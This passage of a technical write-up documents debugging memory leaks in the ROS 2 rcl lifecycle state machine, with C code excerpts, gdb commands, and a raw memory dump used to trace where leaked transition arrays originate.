    <span id="cb114-12"><a href="#cb114-12" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb114-13"><a href="#cb114-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb114-14"><a href="#cb114-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb114-15"><a href="#cb114-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb114-16"><a href="#cb114-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb114-17"><a href="#cb114-17" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from errorprocessing to finalized</span></span>
    <span id="cb114-18"><a href="#cb114-18" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb114-19"><a href="#cb114-19" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_error_error <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb114-20"><a href="#cb114-20" aria-hidden="true" tabindex="-1"></a>    rcl_lifecycle_transition_error_label<span class="op">,</span></span>
    <span id="cb114-21"><a href="#cb114-21" aria-hidden="true" tabindex="-1"></a>    lifecycle_msgs__msg__Transition__TRANSITION_ON_ERROR_ERROR<span class="op">,</span></span>
    <span id="cb114-22"><a href="#cb114-22" aria-hidden="true" tabindex="-1"></a>    errorprocessing_state<span class="op">,</span> finalized_state</span>
    <span id="cb114-23"><a href="#cb114-23" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
    <span id="cb114-24"><a href="#cb114-24" aria-hidden="true" tabindex="-1"></a>  ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb114-25"><a href="#cb114-25" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">,</span></span>
    <span id="cb114-26"><a href="#cb114-26" aria-hidden="true" tabindex="-1"></a>    rcl_transition_on_error_error<span class="op">,</span></span>
    <span id="cb114-27"><a href="#cb114-27" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">);</span></span>
    <span id="cb114-28"><a href="#cb114-28" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb114-29"><a href="#cb114-29" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb114-30"><a href="#cb114-30" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb114-31"><a href="#cb114-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <h5 id="case-2">Case 2</h5>
    <p>Leak in the last case</p>
    <div class="sourceCode" id="cb115"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb115-1"><a href="#cb115-1" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from cleaningup to inactive</span></span>
    <span id="cb115-2"><a href="#cb115-2" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
    <span id="cb115-3"><a href="#cb115-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_cleanup_failure <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb115-4"><a href="#cb115-4" aria-hidden="true" tabindex="-1"></a>      rcl_lifecycle_transition_failure_label<span class="op">,</span></span>
    <span id="cb115-5"><a href="#cb115-5" aria-hidden="true" tabindex="-1"></a>      lifecycle_msgs__msg__Transition__TRANSITION_ON_CLEANUP_FAILURE<span class="op">,</span></span>
    <span id="cb115-6"><a href="#cb115-6" aria-hidden="true" tabindex="-1"></a>      cleaningup_state<span class="op">,</span> inactive_state</span>
    <span id="cb115-7"><a href="#cb115-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">};</span></span>
    <span id="cb115-8"><a href="#cb115-8" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb115-9"><a href="#cb115-9" aria-hidden="true" tabindex="-1"></a>      transition_map<span class="op">,</span></span>
    <span id="cb115-10"><a href="#cb115-10" aria-hidden="true" tabindex="-1"></a>      rcl_transition_on_cleanup_failure<span class="op">,</span></span>
    <span id="cb115-11"><a href="#cb115-11" aria-hidden="true" tabindex="-1"></a>      allocator<span class="op">);</span></span>
    <span id="cb115-12"><a href="#cb115-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb115-13"><a href="#cb115-13" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb115-14"><a href="#cb115-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb115-15"><a href="#cb115-15" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb115-16"><a href="#cb115-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb115-17"><a href="#cb115-17" aria-hidden="true" tabindex="-1"></a>  <span class="co">// register transition from cleaniningup to errorprocessing</span></span>
    <span id="cb115-18"><a href="#cb115-18" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
    <span id="cb115-19"><a href="#cb115-19" aria-hidden="true" tabindex="-1"></a>    <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_cleanup_error <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb115-20"><a href="#cb115-20" aria-hidden="true" tabindex="-1"></a>      rcl_lifecycle_transition_error_label<span class="op">,</span></span>
    <span id="cb115-21"><a href="#cb115-21" aria-hidden="true" tabindex="-1"></a>      lifecycle_msgs__msg__Transition__TRANSITION_ON_CLEANUP_ERROR<span class="op">,</span></span>
    <span id="cb115-22"><a href="#cb115-22" aria-hidden="true" tabindex="-1"></a>      cleaningup_state<span class="op">,</span> errorprocessing_state</span>
    <span id="cb115-23"><a href="#cb115-23" aria-hidden="true" tabindex="-1"></a>    <span class="op">};</span></span>
    <span id="cb115-24"><a href="#cb115-24" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb115-25"><a href="#cb115-25" aria-hidden="true" tabindex="-1"></a>      transition_map<span class="op">,</span></span>
    <span id="cb115-26"><a href="#cb115-26" aria-hidden="true" tabindex="-1"></a>      rcl_transition_on_cleanup_error<span class="op">,</span></span>
    <span id="cb115-27"><a href="#cb115-27" aria-hidden="true" tabindex="-1"></a>      allocator<span class="op">);</span></span>
    <span id="cb115-28"><a href="#cb115-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb115-29"><a href="#cb115-29" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb115-30"><a href="#cb115-30" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb115-31"><a href="#cb115-31" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span></code></pre></div>
    <h5 id="case-3">Case 3</h5>
    <p>Leak in the last case</p>
    <div class="sourceCode" id="cb116"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb116-1"><a href="#cb116-1" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from activating to active</span></span>
    <span id="cb116-2"><a href="#cb116-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb116-3"><a href="#cb116-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_activate_success <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb116-4"><a href="#cb116-4" aria-hidden="true" tabindex="-1"></a>    rcl_lifecycle_transition_success_label<span class="op">,</span></span>
    <span id="cb116-5"><a href="#cb116-5" aria-hidden="true" tabindex="-1"></a>    lifecycle_msgs__msg__Transition__TRANSITION_ON_ACTIVATE_SUCCESS<span class="op">,</span></span>
    <span id="cb116-6"><a href="#cb116-6" aria-hidden="true" tabindex="-1"></a>    activating_state<span class="op">,</span> active_state</span>
    <span id="cb116-7"><a href="#cb116-7" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
    <span id="cb116-8"><a href="#cb116-8" aria-hidden="true" tabindex="-1"></a>  ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb116-9"><a href="#cb116-9" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">,</span></span>
    <span id="cb116-10"><a href="#cb116-10" aria-hidden="true" tabindex="-1"></a>    rcl_transition_on_activate_success<span class="op">,</span></span>
    <span id="cb116-11"><a href="#cb116-11" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">);</span></span>
    <span id="cb116-12"><a href="#cb116-12" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb116-13"><a href="#cb116-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb116-14"><a href="#cb116-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb116-15"><a href="#cb116-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb116-16"><a href="#cb116-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb116-17"><a href="#cb116-17" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from activating to inactive</span></span>
    <span id="cb116-18"><a href="#cb116-18" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb116-19"><a href="#cb116-19" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_activate_failure <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb116-20"><a href="#cb116-20" aria-hidden="true" tabindex="-1"></a>    rcl_lifecycle_transition_failure_label<span class="op">,</span></span>
    <span id="cb116-21"><a href="#cb116-21" aria-hidden="true" tabindex="-1"></a>    lifecycle_msgs__msg__Transition__TRANSITION_ON_ACTIVATE_FAILURE<span class="op">,</span></span>
    <span id="cb116-22"><a href="#cb116-22" aria-hidden="true" tabindex="-1"></a>    activating_state<span class="op">,</span> inactive_state</span>
    <span id="cb116-23"><a href="#cb116-23" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
    <span id="cb116-24"><a href="#cb116-24" aria-hidden="true" tabindex="-1"></a>  ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb116-25"><a href="#cb116-25" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">,</span></span>
    <span id="cb116-26"><a href="#cb116-26" aria-hidden="true" tabindex="-1"></a>    rcl_transition_on_activate_failure<span class="op">,</span></span>
    <span id="cb116-27"><a href="#cb116-27" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">);</span></span>
    <span id="cb116-28"><a href="#cb116-28" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb116-29"><a href="#cb116-29" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb116-30"><a href="#cb116-30" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb116-31"><a href="#cb116-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb116-32"><a href="#cb116-32" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb116-33"><a href="#cb116-33" aria-hidden="true" tabindex="-1"></a><span class="co">// register transition from activating to errorprocessing</span></span>
    <span id="cb116-34"><a href="#cb116-34" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb116-35"><a href="#cb116-35" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_t</span> rcl_transition_on_activate_error <span class="op">=</span> <span class="op">{</span></span>
    <span id="cb116-36"><a href="#cb116-36" aria-hidden="true" tabindex="-1"></a>    rcl_lifecycle_transition_error_label<span class="op">,</span></span>
    <span id="cb116-37"><a href="#cb116-37" aria-hidden="true" tabindex="-1"></a>    lifecycle_msgs__msg__Transition__TRANSITION_ON_ACTIVATE_ERROR<span class="op">,</span></span>
    <span id="cb116-38"><a href="#cb116-38" aria-hidden="true" tabindex="-1"></a>    activating_state<span class="op">,</span> errorprocessing_state</span>
    <span id="cb116-39"><a href="#cb116-39" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
    <span id="cb116-40"><a href="#cb116-40" aria-hidden="true" tabindex="-1"></a>  ret <span class="op">=</span> rcl_lifecycle_register_transition<span class="op">(</span></span>
    <span id="cb116-41"><a href="#cb116-41" aria-hidden="true" tabindex="-1"></a>    transition_map<span class="op">,</span></span>
    <span id="cb116-42"><a href="#cb116-42" aria-hidden="true" tabindex="-1"></a>    rcl_transition_on_activate_error<span class="op">,</span></span>
    <span id="cb116-43"><a href="#cb116-43" aria-hidden="true" tabindex="-1"></a>    allocator<span class="op">);</span></span>
    <span id="cb116-44"><a href="#cb116-44" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>ret <span class="op">!=</span> RCL_RET_OK<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb116-45"><a href="#cb116-45" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret<span class="op">;</span></span>
    <span id="cb116-46"><a href="#cb116-46" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
    <span id="cb116-47"><a href="#cb116-47" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>(Note: dumping a .gdbinit in the home dir makes CLion fetch it but it seems to have some problems with <code>wget -P ~ git.io/.gdbinit</code> so skipping it for now and doing it manually)</p>
    <figure>
    <img src="background/images/2019/09/debugging-session-state-valid-transitions-has-a-previous-value-when-leaks.png" alt="Debugging session, state-&gt;valid_transitions has a previous value when leaks" /><figcaption aria-hidden="true">Debugging session, state-&gt;valid_transitions has a previous value when leaks</figcaption>
    </figure>
    <p>After debugging for a while, it appears that whenever there’s a leak in 131 is because <code>state-&gt;valid_transitions</code> has a value before. Note that <code>state-&gt;valid_transition_size</code> is 3 (which matches the 32*3 = 96 bytes leaked) in those cases.</p>
    <p><em>I checked similar calls and also presents situation where it has a value thereby I’m discarding the leak due to the realloc call.</em></p>
    <p>Similarly, I validated that there’re also leaks when <code>state-&gt;valid_transition_size</code> is 2 which leads to a 64 byte leak.</p>
    <p>Let’s dive into the memory and try to figure out when <code>new_valid_transitions</code> (asigned later to <code>state-&gt;valid_transition</code>) is released and when isn’t. Let’s start in the case of no leak:</p>
    <p><code>transition_map</code> presents a memory layout as follows:</p>
    <figure>
    <img src="background/images/2019/09/memory-layout-of-transition-map-non-leaky-call.png" alt="memory layout of transition_map, non-leaky call" /><figcaption aria-hidden="true">memory layout of transition_map, non-leaky call</figcaption>
    </figure>
    <p>Note that <code>transition_map</code> has an element states <code>transition_map-&gt;states</code> and this one starts at <code>0x613000001700</code>. Since there’re 11 states in the map (see <code>transitions_size</code> variable), the transition_map states go from <code>0x613000001700</code> til</p>
    <div class="sourceCode" id="cb117"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb117-1"><a href="#cb117-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p/x</span> 0x613000001700 + 11<span class="pp">*</span>64</span>
    <span id="cb117-2"><a href="#cb117-2" aria-hidden="true" tabindex="-1"></a><span class="va">$6</span> = 0x6130000019c0</span></code></pre></div>
    <p>For the purpose of this analysis, what’s relevant here is the address of <code>state</code> which is <code>0x613000001840</code> and its content highlighted in green below:</p>
    <figure>
    <img src="background/images/2019/09/content-in-memory-of-the-state-variable.png" alt="content in memory of the state variable" /><figcaption aria-hidden="true">content in memory of the state variable</figcaption>
    </figure>
    <p>Now, in line 115, a call to <code>allocator-&gt;reallocate</code> happens which is going to increase the memory of <code>transition_map-&gt;transitions</code> in 32 bytes (sizeof(rcl_lifecycle_transition_t)). Before the reallocation, memory looks as follows:</p>
    <div class="sourceCode" id="cb118"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb118-1"><a href="#cb118-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> transition_map-<span class="op">&gt;</span>transitions</span>
    <span id="cb118-2"><a href="#cb118-2" aria-hidden="true" tabindex="-1"></a><span class="va">$1</span><span class="ex">5</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x617000004680</span></span>
    <span id="cb118-3"><a href="#cb118-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> transition_map-<span class="op">&gt;</span>transitions_size</span>
    <span id="cb118-4"><a href="#cb118-4" aria-hidden="true" tabindex="-1"></a><span class="va">$1</span><span class="ex">6</span> = 24</span>
    <span id="cb118-5"><a href="#cb118-5" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> sizeof<span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span><span class="kw">)</span></span>
    <span id="cb118-6"><a href="#cb118-6" aria-hidden="true" tabindex="-1"></a><span class="va">$1</span><span class="ex">7</span> = 32</span>
    <span id="cb118-7"><a href="#cb118-7" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> sizeof<span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span><span class="kw">)</span><span class="ex">*23</span> <span class="co"># 23, 24 - 1 because it has already iterated</span></span>
    <span id="cb118-8"><a href="#cb118-8" aria-hidden="true" tabindex="-1"></a><span class="va">$1</span><span class="ex">8</span> = 736</span>
    <span id="cb118-9"><a href="#cb118-9" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/736b</span> 0x617000004680</span>
    <span id="cb118-10"><a href="#cb118-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004680:</span> 0x40    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-11"><a href="#cb118-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004688:</span> 0x01    0x00    0x00    0x00    0xe0    0x60    0x00    0x00</span>
    <span id="cb118-12"><a href="#cb118-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004690:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-13"><a href="#cb118-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004698:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-14"><a href="#cb118-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046a0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-15"><a href="#cb118-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046a8:</span> 0x0a    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-16"><a href="#cb118-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046b0:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-17"><a href="#cb118-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046b8:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-18"><a href="#cb118-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046c0:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-19"><a href="#cb118-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046c8:</span> 0x0b    0x00    0x00    0x00    0xff    0x0f    0x00    0x00</span>
    <span id="cb118-20"><a href="#cb118-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046d0:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-21"><a href="#cb118-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046d8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-22"><a href="#cb118-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046e0:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-23"><a href="#cb118-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046e8:</span> 0x0c    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-24"><a href="#cb118-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046f0:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-25"><a href="#cb118-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046f8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-26"><a href="#cb118-26" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004700:</span> 0x80    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-27"><a href="#cb118-27" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004708:</span> 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-28"><a href="#cb118-28" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004710:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-29"><a href="#cb118-29" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004718:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-30"><a href="#cb118-30" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004720:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-31"><a href="#cb118-31" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004728:</span> 0x14    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-32"><a href="#cb118-32" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004730:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-33"><a href="#cb118-33" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004738:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-34"><a href="#cb118-34" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004740:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-35"><a href="#cb118-35" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004748:</span> 0x15    0x00    0x00    0x00    0xfc    0x7f    0x00    0x00</span>
    <span id="cb118-36"><a href="#cb118-36" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004750:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-37"><a href="#cb118-37" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004758:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-38"><a href="#cb118-38" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004760:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-39"><a href="#cb118-39" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004768:</span> 0x16    0x00    0x00    0x00    0xfd    0xfd    0xfd    0xfd</span>
    <span id="cb118-40"><a href="#cb118-40" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004770:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-41"><a href="#cb118-41" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004778:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-42"><a href="#cb118-42" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004780:</span> 0xc0    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-43"><a href="#cb118-43" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004788:</span> 0x03    0x00    0x00    0x00    0x6e    0x73    0x00    0x00</span>
    <span id="cb118-44"><a href="#cb118-44" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004790:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-45"><a href="#cb118-45" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004798:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-46"><a href="#cb118-46" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047a0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-47"><a href="#cb118-47" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047a8:</span> 0x1e    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-48"><a href="#cb118-48" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047b0:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-49"><a href="#cb118-49" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047b8:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-50"><a href="#cb118-50" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047c0:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-51"><a href="#cb118-51" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047c8:</span> 0x1f    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-52"><a href="#cb118-52" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047d0:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-53"><a href="#cb118-53" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047d8:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-54"><a href="#cb118-54" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047e0:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-55"><a href="#cb118-55" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047e8:</span> 0x20    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-56"><a href="#cb118-56" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047f0:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-57"><a href="#cb118-57" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047f8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-58"><a href="#cb118-58" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004800:</span> 0x00    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-59"><a href="#cb118-59" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004808:</span> 0x04    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-60"><a href="#cb118-60" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004810:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-61"><a href="#cb118-61" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004818:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-62"><a href="#cb118-62" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004820:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-63"><a href="#cb118-63" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004828:</span> 0x28    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-64"><a href="#cb118-64" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004830:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-65"><a href="#cb118-65" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004838:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-66"><a href="#cb118-66" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004840:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-67"><a href="#cb118-67" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004848:</span> 0x29    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
